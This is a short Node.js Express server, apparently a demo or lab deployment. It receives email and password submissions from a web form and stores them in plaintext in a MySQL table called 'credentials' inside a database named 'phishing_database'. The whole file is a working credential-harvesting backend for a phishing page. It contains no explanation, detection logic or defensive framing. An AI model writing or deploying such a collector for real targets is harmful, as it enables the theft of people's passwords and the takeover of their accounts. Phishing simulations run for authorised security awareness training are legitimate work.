const express = require("express");
const mysql = require("mysql2/promise");

const app = express();
const PORT = process.env.PORT || 6050;

// Parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post("/submit", async (req, res) => {
    const { email, password } = req.body;

    let connection;

    try {
        connection = await mysql.createConnection({
            host: process.env.DB_HOST || "mysql-0.mysql-service",
            user: process.env.DB_USER || "demo",
            password: process.env.DB_PASSWORD || "demo",
            database: process.env.DB_NAME || "phishing_database",
        });

        // Ensure the table exists
        await connection.execute(`
            CREATE TABLE IF NOT EXISTS credentials (
                id INT AUTO_INCREMENT PRIMARY KEY,
                email VARCHAR(255),
                password VARCHAR(255)
            )
        `);

        // Insert credentials
        await connection.execute(
            "INSERT INTO credentials (email, password) VALUES (?, ?)",
            [email, password]
        );

        res.send("Credentials submitted successfully!!! by mamdouhhhhhhhazemmmmmmmtestttt");
    } catch (err) {
        console.error(err);
        res.status(500).send("Database error");
    } finally {
        if (connection) {
            await connection.end();
        }
    }
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
